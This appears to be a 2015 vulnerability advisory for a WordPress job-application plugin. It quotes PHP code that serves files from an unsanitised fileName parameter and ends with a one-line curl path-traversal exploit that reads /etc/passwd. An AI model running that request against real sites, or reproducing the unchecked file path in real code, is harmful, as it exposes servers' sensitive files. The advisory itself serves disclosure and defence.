@@ -1,0 +1,34 @@
+Title: Remote file download vulnerability in candidate-application-form v1.0 wordpress plugin
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-12
+Download Site: https://wordpress.org/plugins/candidate-application-form
+Vendor: https://profiles.wordpress.org/flaxlandsconsulting/
+Vendor Notified: 2015-07-12
+Vendor Contact:
+Description: This plugin allows you to easily add a candidate application form to a job vacancy post, which allows the candidate to apply for the vacancy.
+Vulnerability:
+The code in downloadpdffile.php  doesn't do any sanity checks, allowing a remote attacker to download sensitive system files:
+
+ <?php
+  2 $file_name = $_GET["fileName"];
+  3 $path = $_GET["fileUrl"];
+  4 $fullfile = $path.$file_name;
+  5 if (file_exists('../../uploads/candidate_application_form/'.$file_name)) {
+  6     header('Pragma: public');   // required
+  7     header('Expires: 0');       // no cache
+  8     header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+  9     header('Last-Modified: '.gmdate ('D, d M Y H:i:s', filemtime ('../../uploads/candidate_application_form/'.$file_    name)).' GMT');
+ 10     header('Cache-Control: private',false);
+ 11     header('Content-Type: '.'application/pdf');
+ 12     header('Content-Disposition: attachment; filename="'.basename('../../uploads/candidate_application_form/'.$file_    name).'"');
+ 13     header('Content-Transfer-Encoding: binary');
+ 14     header('Content-Length: '.filesize('../../uploads/candidate_application_form/'.$file_name));    // provide file     size
+ 15     header('Connection: close');
+ 16     readfile('../../uploads/candidate_application_form/'.$file_name);     // push it out
+ 17     exit();
+ 18 }
+
+CVEID:
+OSVDB:
+Exploit Code:
+  • $ curl http://server/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd
